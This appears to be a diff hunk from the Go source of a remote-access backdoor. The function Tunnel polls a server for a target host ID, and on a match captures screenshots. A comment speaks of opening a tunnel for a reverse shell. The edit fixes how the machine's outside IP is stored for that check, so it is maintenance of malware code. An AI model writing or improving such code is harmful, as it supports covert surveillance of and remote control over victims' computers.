@@ -58,8 +58,8 @@ func Tunnel(addr string) {
 		if resp.StatusCode == 200 && body != "" {
 			if err := json.Unmarshal([]byte(body), &check); err == nil {
 				// if not need  dont open the tunnel to revert shell
-				lib.GetOutIp()
-				if check.Hostid == lib.HOSTID || check.Hostid == lib.OUTIP {
+				outip := lib.GetOutIp()
+				if check.Hostid == lib.HOSTID || check.Hostid == outip {
 					filenames := lib.Getscreenshot()
 					finflag := make(chan string)
 					for _, fname := range filenames {
